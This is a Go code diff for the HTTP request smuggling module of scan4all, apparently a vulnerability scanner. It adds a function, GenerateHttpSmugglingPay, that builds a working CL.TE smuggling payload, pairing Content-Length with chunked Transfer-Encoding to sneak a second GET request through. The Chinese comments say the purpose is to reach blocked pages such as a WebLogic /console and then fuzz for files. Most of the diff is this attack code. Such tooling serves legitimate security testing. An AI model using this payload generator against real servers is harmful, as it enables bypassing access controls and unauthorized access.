@@ -1,8 +1,12 @@
 package Smuggling
 
 import (
+	"fmt"
 	"github.com/hktalent/scan4all/lib/socket"
 	"github.com/hktalent/scan4all/lib/util"
+	"log"
+	"net/url"
+	"strings"
 )
 
 // 接口定义
@@ -33,6 +37,8 @@ func checkSmuggling4Poc(ClTePayload *[]string, nTimes int, r1 *Smuggling, r *soc
 
 /*
  check HTTP Request Smuggling
+   可以利用走私尝试访问，被常规手段屏蔽的路径，例如 weblogic 的页面
+  https://portswigger.net/web-security/request-smuggling/finding
   https://hackerone.com/reports/1630668
   https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483
   1、每个目标的登陆页面只做一次检测，也就是发现你登陆页面的路径可以做一次检测
@@ -61,4 +67,41 @@ func DoCheckSmuggling(szUrl string, szBody string) {
 			}
 		}(x, szUrl)
 	}
+}
+
+// 构造走私，用来访问被屏蔽的页面
+//  确认存在走私漏洞后，可以继续基于走私 走以便filefuzz
+//  1、首先 szUrl必须是可访问的 200，否则可能会导致误判
+//  @szUrl 设施走私的目标
+//  @smugglinUrlPath 希望走私能访问到到页面，例如 /console
+//  @secHost 第二段头的host
+func GenerateHttpSmugglingPay(szUrl, smugglinUrlPath, secHost string) string {
+	a := []string{`POST %s HTTP/1.1
+Host: %s
+Content-Type: application/x-www-form-urlencoded%s
+Content-Length: %d
+Transfer-Encoding: chunked
+
+`, `0
+
+GET %s HTTP/1.1
+Host: %s
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=`}
+	u, err := url.Parse(szUrl)
+	if nil != err {
+		log.Println("GenerateHttpSmugglingPay url.Parse err: ", err)
+		return ""
+	}
+	for i, x := range a {
+		a[i] = strings.ReplaceAll(x, "\n", "\r\n")
+	}
+	sf := a[1]
+	a[1] = fmt.Sprintf(sf, smugglinUrlPath, secHost)
+
+	sf = a[0]
+	a[0] = fmt.Sprintf(sf, u.RawPath, u.Host, util.GetCustomHeadersRaw(), len([]byte(a[1])))
+	return strings.Join(a, "")
 }
